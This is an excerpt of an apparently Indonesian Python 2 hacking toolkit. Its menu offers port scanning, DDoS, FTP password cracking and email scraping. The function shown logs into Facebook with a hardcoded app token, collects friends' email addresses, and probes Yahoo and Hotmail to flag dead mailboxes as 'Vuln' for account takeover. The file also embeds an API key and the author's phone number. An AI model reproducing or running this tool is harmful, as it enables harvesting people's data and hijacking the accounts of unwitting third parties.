from datetime import datetime;import random;import nmap,json,html2text,subprocess,os,sys,mechanize,requests,urllib;from time import sleep;from socket import *;from hashlib import *;from urllib2 import *;from string import *;from random import *;import re;from modul import *
...
# nomer 8
def defense():
    subprocess.call("clear", shell = True);reload(sys);sys.setdefaultencoding('utf8');br = mechanize.Browser();y = (g + "-" * 50)
    yopie = (y + p + "\nAuthor :" + g + " Mr.w0n63d4n\n" + r + p + "Github :" + g + " https://github.com/wongedan123\n" + r + p + "Contact wa :" + g + " +628811664850\n" + y + p + "\nLogin fb your account\n" + r);br.set_handle_robots(False);os.system("clear")
    print yopie
    idt = raw_input(p + "[" + g + "*" + p + "]" + k + " Username/Email\033[0m : " + g);passw = raw_input(p + "[" + g + "*" + p + "]" + k + " Password\033[0m : " + g)
    url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + (idt) + "&locale=en_US&password=" + (passw) + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6";data = urllib.urlopen(url);op = json.load(data)
    if 'access_token' in op:
    	token = (op["access_token"]);print (p + "[" + b + "+" + p + "]" + g + " Login successfull")
    else:
    	print (p + "[" + m + "!" + p + "]" + m + " Login failed coba cek connection kamu atau cek fb barangkali dapat security ganti sandi!" + r)
    	pilih()
    get_friends = requests.get('https://graph.facebook.com/me/friends?access_token='+token);hasil = json.loads(get_friends.text);print (p + "[" + g + "+" + p + "]" + g + " Berhasil Mendapatkan ID Teman..." + r)
    #cok = open('Mail_Yahoo.txt','w')
    global o, h;o = [];h = 0;print g + 55*"-";print g + "| " + 11*" " + u + "Email" + 14*" " + g + "|" + 9*" " + k + "Cek!" + 8*" " + g + "|";print 55*"-"
    for i in hasil['data']:
        wrna = "\033[32m";wrne = "\033[39m";h += 1;o.append(h);x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token);z = json.loads(x.text)
        try:
            kunci = re.compile(r'@.*');cari = kunci.search(z['email']).group()
            if 'yahoo.com' in cari:
                br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com");br._factory.is_html = True;br.select_form(nr=0);br["username"] = z['email'];j = br.submit().read()
                Wong = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    cd = Wong.search(j).group()
                except:
                    vuln = 6*" " + m + "Not Vuln";lean = 30 - (len(z['email']));eml = lean * " ";lone = 24 - (len(vuln));namel = lone * " ";print g + "| " + g + z['email'] + eml + g + "| " + wrne + vuln + namel + g + " |"
                    continue
                if '"messages.ERROR_INVALID_USERNAME">' in cd:
                    vuln = 8*" " + g + "Vuln"
                else:
                    vuln = 5*" " + m + "Not Vuln"
                lean = 30 - (len(z['email']));eml = lean * " ";lone = 24 - (len(vuln));namel = lone * " ";print g + "| " + g + z['email'] + eml + g + "| " + wrne + vuln + namel + g + " |"
            elif 'hotmail' in cari:
                url = ("http://apilayer.net/api/check?access_key=7a58ece2d10e54d09e93b71379677dbb&email=" + z['email'] + "&smtp=1&format=1");cek = json.loads(requests.get(url).text)
                if cek['smtp_check'] == 0:
                    vuln = 8*" " + g + "Vuln"
                else:
                    vuln = 5*" " + m + "Not Vuln"
...
def main():
    ...
    print m + "[" + p + "01" + m + "]" + g + ".Port Scanning" + "                " + m + "[" + p + "11" + m + "]" + g + ".Admin finder" + r;print m + "[" + p + "02" + m + "]" + g + ".DDOS" + "                         " + m + "[" + p + "12" + m + "]" + g + ".cari no whatsapp" + r	;print m + "[" + p + "03" + m + "]" + g + ".HTTP headers" + "                 " + m + "[" + p + "13" + m + "]" + g + ".hash password" + r
    print m + "[" + p + "04" + m + "]" + g + ".infor all URLs for hacking" + r
    print m + "[" + p + "05" + m + "]" + g + ".FTP Password Cracker" + r
    print m + "[" + p + "06" + m + "]" + g + ".Email Scraping" + r
